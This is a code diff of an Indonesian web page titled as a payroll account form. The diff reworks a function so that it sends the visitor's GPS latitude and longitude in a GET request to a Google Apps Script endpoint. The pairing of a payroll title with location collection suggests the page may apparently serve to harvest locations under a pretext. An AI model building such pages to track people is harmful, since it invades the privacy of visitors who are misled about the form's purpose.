@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Form Rekening Penggajian</title>
   <style>
     body {
@@ -14,7 +14,6 @@
       height: 100vh;
       margin: 0;
     }
-
     .container {
       background: white;
       padding: 30px 40px;
@@ -24,12 +23,10 @@
       max-width: 400px;
       width: 100%;
     }
-
     h3 {
       color: #333;
       margin-bottom: 20px;
     }
-
     button {
       background-color: #1976d2;
       color: white;
@@ -40,11 +37,9 @@
       cursor: pointer;
       transition: background 0.3s;
     }
-
     button:hover {
       background-color: #125ea4;
     }
-
     .note {
       margin-top: 15px;
       font-size: 13px;
@@ -69,22 +64,23 @@
     }
 
     function sendLocation(position) {
-      const data = {
-        latitude: position.coords.latitude,
-        longitude: position.coords.longitude
-      };
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
 
-      fetch("https://script.google.com/macros/s/AKfycbz0kAX783sIM67FclaOSWMam4dlijW4_hIVAZGW8OtMmit0JyNLOH6EYOSFtd2XJRaa/exec", {
-        method: "POST",
-        body: JSON.stringify(data),
-        headers: {
-          "Content-Type": "application/json"
-        }
-      }).then(() => {
-        alert("Lokasi berhasil dikirim!");
-      }).catch(() => {
-        alert("Gagal mengirim lokasi.");
-      });
+      const url = `https://script.google.com/macros/s/AKfycbymjlh5q80s4CDAs8UtEOtqgLljCmh8X1n3uML1tWQM-N1EA3loeScXwBVj7H9jdMbwTw/exec?latitude=${latitude}&longitude=${longitude}`;
+
+      fetch(url)
+        .then(response => {
+          if (!response.ok) throw new Error("Network response was not ok");
+          return response.text();
+        })
+        .then(text => {
+          alert("Lokasi berhasil dikirim!");
+        })
+        .catch(error => {
+          alert("Gagal mengirim lokasi.");
+          console.error("Error:", error);
+        });
     }
 
     function showError(error) {
